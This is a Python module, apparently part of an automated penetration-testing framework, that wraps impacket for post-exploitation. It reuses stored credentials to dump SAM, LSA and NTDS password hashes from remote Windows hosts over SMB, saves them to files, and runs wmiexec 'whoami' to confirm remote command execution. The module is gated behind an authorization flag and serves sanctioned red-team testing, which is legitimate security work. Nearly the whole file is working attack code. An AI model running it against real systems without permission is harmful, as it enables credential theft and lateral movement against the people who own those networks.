"""
impacket_post.py
================
Post-exploitation credential extraction via impacket.

Linux-native equivalent of mimikatz:
  secretsdump  — remote SAM/LSA/NTDS hash extraction via SMB
  wmiexec      — command execution via WMI (no service install)
  psexec       — command execution via SMB service

Emits:
  HO-03: credential harvested (NTLM hash or cleartext)
  HO-17: remote session active (psexec/wmiexec shell obtained)
  AD-15: domain hash dump complete

Activation:
  Gravity schedules this when HO-19 (SMB accessible) AND either
  HO-03 (credential known) or AD-01/AD-02 (domain accounts enumerated)
  are realized — meaning we have a foothold and something to use.
"""
from __future__ import annotations

import json
import logging
import re
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

log = logging.getLogger("skg.gravity.adapter.impacket_post")

INSTRUMENT_NAME = "impacket_post"

ROOT = Path(__file__).resolve().parents[3]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _emit(wicket_id: str, status: str, label: str, detail: str,
          workload_id: str, confidence: float = 0.90,
          pointer: str = "") -> dict:
    from skg.sensors import envelope, precondition_payload
    return envelope(
        event_type="obs.attack.precondition",
        source_id="skg.gravity.impacket_post",
        toolchain="host",
        payload=precondition_payload(
            wicket_id=wicket_id,
            label=label,
            domain="host",
            workload_id=workload_id,
            realized=(status == "realized"),
            detail=detail,
        ),
        evidence_rank=1,
        source_kind="impacket",
        pointer=pointer,
        confidence=confidence,
    )


def _get_credentials(ip: str) -> list[dict]:
    """Load harvested credentials for this target from CredentialStore."""
    creds: list[dict] = []
    try:
        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
        from cred_reuse import CredentialStore
        store = CredentialStore()
        creds = list(store.for_target(ip) or [])
    except Exception as exc:
        log.debug(f"[impacket_post] cred store lookup failed: {exc}")
    return creds


def _secretsdump(ip: str, domain: str, username: str, password: str,
                 lmhash: str, nthash: str, out_dir: Path, workload_id: str) -> list[dict]:
    """
    Dump SAM/LSA/NTDS hashes from target via impacket secretsdump.

    Returns list of obs events.
    """
    events: list[dict] = []
    try:
        from impacket.examples.secretsdump import (
            RemoteOperations, SAMHashes, LSASecrets, NTDSHashes,
        )
        from impacket.smbconnection import SMBConnection

        smb = SMBConnection(ip, ip, timeout=15)
        if lmhash or nthash:
            smb.kerberosLogin(username, password, domain, lmhash, nthash)
        else:
            smb.login(username, password, domain)

        remote_ops = RemoteOperations(smb, False, None)
        remote_ops.enableRegistry()

        dumped_hashes: list[str] = []

        try:
            SAM = SAMHashes(remote_ops.saveSAM(), None, isRemote=True)
            SAM.dump()
            SAM.export(str(out_dir / f"sam_hashes_{ip.replace('.','_')}.txt"))
            dumped_hashes.extend(SAM._SAMHashes or [])
        except Exception as exc:
            log.debug(f"[secretsdump] SAM: {exc}")

        try:
            LSA = LSASecrets(remote_ops.saveSECURITY(), remote_ops.retrieveBootKey(),
                             remote_ops, isRemote=True)
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        except Exception as exc:
            log.debug(f"[secretsdump] LSA: {exc}")

        remote_ops.finish()
        smb.logoff()

        if dumped_hashes:
            events.append(_emit("HO-03", "realized",
                                f"SAM hashes dumped from {ip}",
                                f"secretsdump obtained {len(dumped_hashes)} hashes",
                                workload_id, confidence=0.95))

    except ImportError as exc:
        log.warning(f"[impacket_post] impacket API unavailable: {exc}")
    except Exception as exc:
        log.debug(f"[secretsdump] {ip}: {exc}")

    return events


def _secretsdump_subprocess(ip: str, domain: str, username: str, password: str,
                             out_dir: Path, workload_id: str) -> list[dict]:
    """
    Subprocess fallback: call secretsdump.py directly if impacket API call fails.
    Works when impacket is installed in any discoverable Python path.
    """
    import subprocess
    import shutil

    events: list[dict] = []
    python_bin = shutil.which("python3") or "python3"

    # Try to find secretsdump script
    script_paths = [
        "/usr/share/doc/python-impacket/examples/secretsdump.py",
        "/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py",
    ]
    # Also try finding via importlib
    try:
        import importlib.util
        spec = importlib.util.find_spec("impacket.examples.secretsdump")
        if spec and spec.origin:
            script_paths.insert(0, spec.origin)
    except Exception:
        pass

    script = next((p for p in script_paths if Path(p).exists()), None)
    if not script:
        return events

    target_str = f"{domain}/{username}:{password}@{ip}" if domain else f"{username}:{password}@{ip}"
    out_file = out_dir / f"secretsdump_{ip.replace('.','_')}.txt"
    cmd = [python_bin, script, target_str, "-outputfile", str(out_file)]

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = proc.stdout + proc.stderr

        # Parse hash lines: username:rid:lmhash:nthash:::
        hashes = [l for l in output.splitlines()
                  if re.match(r"^\S+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", l)]
        if hashes:
            events.append(_emit("HO-03", "realized",
                                f"{len(hashes)} hashes from {ip}",
                                f"secretsdump subprocess: {len(hashes)} NTLM hashes",
                                workload_id, confidence=0.92))
    except Exception as exc:
        log.debug(f"[secretsdump-subprocess] {ip}: {exc}")

    return events


def _wmiexec_probe(ip: str, domain: str, username: str, password: str,
                   out_dir: Path, workload_id: str) -> list[dict]:
    """Try a non-destructive WMI command (whoami) to confirm remote execution."""
    import subprocess
    import shutil

    events: list[dict] = []
    python_bin = shutil.which("python3") or "python3"

    try:
        import importlib.util
        spec = importlib.util.find_spec("impacket.examples.wmiexec")
        if not (spec and spec.origin):
            return events
        script = spec.origin
    except Exception:
        return events

    target_str = f"{domain}/{username}:{password}@{ip}" if domain else f"{username}:{password}@{ip}"
    try:
        proc = subprocess.run(
            [python_bin, script, target_str, "whoami"],
            capture_output=True, text=True, timeout=30,
        )
        output = (proc.stdout + proc.stderr).lower()
        if any(marker in output for marker in ["\\", "authority", "nt ", "system"]):
            events.append(_emit("HO-17", "realized",
                                f"WMI remote execution confirmed on {ip}",
                                f"wmiexec whoami: {proc.stdout.strip()[:80]}",
                                workload_id, confidence=0.95))
    except Exception as exc:
        log.debug(f"[wmiexec] {ip}: {exc}")

    return events


def run(ip: str, target: dict, run_id: str, out_dir: Path,
        result: dict, *, authorized: bool = False, node_key: str = "",
        **kwargs) -> dict:
    """
    Run impacket post-exploitation against target.

    Requires: realized HO-19 (SMB port open) AND at least one credential
    in the CredentialStore for this target.

    Without --authorized, this is skipped (impacket_post is an exploitation action).
    """
    if not authorized:
        result["skipped"] = "impacket_post requires --authorized"
        result["success"] = False
        return result

    workload_id = f"host::{node_key or ip}"
    out_path = Path(out_dir) if out_dir else Path("/tmp")
    out_path.mkdir(parents=True, exist_ok=True)

    # Load credentials for this target
    creds = _get_credentials(ip)
    if not creds:
        result["error"] = "No credentials in store for this target — run enum4linux or hydra first"
        result["success"] = False
        return result

    events: list[dict] = []
    for cred in creds[:3]:  # try up to 3 credential pairs
        username = cred.get("user", "")
        password = cred.get("secret", "")
        domain   = cred.get("domain", "") or ""
        lmhash   = cred.get("lmhash", "aad3b435b51404eeaad3b435b51404ee")
        nthash   = cred.get("nthash", "")

        if not username:
            continue

        # secretsdump — primary hash extraction
        evts = _secretsdump(ip, domain, username, password, lmhash, nthash,
                            out_path, workload_id)
        if not evts:
            evts = _secretsdump_subprocess(ip, domain, username, password,
                                           out_path, workload_id)
        events.extend(evts)

        # WMI exec probe (non-destructive: whoami only)
        events.extend(_wmiexec_probe(ip, domain, username, password,
                                     out_path, workload_id))

        if events:
            break  # first working credential is enough

    if events:
        try:
            from skg.kernel.adapters import event_to_observation
            # Events are already in the correct envelope format
            ev_file = out_path / f"gravity_impacket_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
            with ev_file.open("w") as fh:
                for ev in events:
                    fh.write(json.dumps(ev) + "\n")
            result["events_file"] = str(ev_file)
            result["events_emitted"] = len(events)
        except Exception as exc:
            log.debug(f"[impacket_post] event write failed: {exc}")

    result["success"] = True
    result["unknowns_resolved"] = len(events)
    return result
